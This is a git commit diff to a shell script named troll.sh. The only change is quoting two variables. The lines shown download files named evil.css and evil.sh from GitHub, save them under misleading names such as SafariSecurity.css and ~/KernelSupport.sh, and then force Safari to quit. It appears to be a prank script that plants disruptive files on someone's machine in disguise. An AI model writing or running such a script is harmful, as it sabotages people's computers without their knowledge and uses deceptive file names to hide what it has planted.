310df5a1c172b0f0733ab01c6e0c9334f9cd2da1
Johnny Wang <johnny-y-wang@users.noreply.github.com>
2017-02-15 11:54:57 -0800

    Update troll.sh

--- troll.sh
+++ troll.sh
@@ -5,8 +5,8 @@ file="$base/SafariSecurity.css"
 evilsh="~/KernelSupport.sh"
 
 mkdir -p "$base"
-curl -L 'https://github.com/tlrobinson/evil.css/raw/master/evil.css' > $file
-curl -L 'https://github.com/mathiasbynens/evil.sh/raw/master/evil.sh' > $evilsh
+curl -L 'https://github.com/tlrobinson/evil.css/raw/master/evil.css' > "$file"
+curl -L 'https://github.com/mathiasbynens/evil.sh/raw/master/evil.sh' > "$evilsh"
 
 osascript -e 'tell application "Safari"' -e 'quit' -e 'end tell'
 sleep 1
